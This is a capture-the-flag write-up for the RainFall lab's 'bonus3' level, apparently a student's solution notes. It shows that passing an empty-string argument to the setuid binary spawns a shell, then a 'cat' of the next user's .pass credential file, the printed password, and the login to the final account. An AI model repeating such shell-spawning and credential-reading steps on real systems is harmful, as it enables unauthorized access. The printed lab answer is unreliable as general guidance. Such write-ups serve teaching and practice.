# Bonus 3

- Once logged in, you will see a binary `bonus3`

```
[???]$ ssh localhost -p 4242 -l bonus3
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
bonus3@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
bonus3@RainFall:~$ ls
bonus3
bonus3@RainFall:~$
```

let's see what the program does

```
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 aaaaaaaaaaaaa

bonus3@RainFall:~$ ./bonus3 aaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaa
bonus3@RainFall:~$ ./bonus3 1111111111111
Segmentation fault (core dumped)
```

after analyzing the binary, there are conditions where argc needs to be equal to 2 (meaning there at least need to be one argument needs to be passed), and if the value is equal to 0, `execl` will be executed. if "" will be passed into the argument, it will meet the condition. Again, if `""` will be passed into the argument, where the `argc` count is still 2, but there is no value exist, the program will pass the condition.

```
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/$(whoami)/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$
bonus3@RainFall:~$ logout

[???]$ ssh localhost -p 4242 -l end
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
end@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
end@RainFall:~$ ls
end
end@RainFall:~$ ./end
./end: line 1: Congratulations: command not found
end@RainFall:~$
end@RainFall:~$ logout
Connection to localhost closed.
```
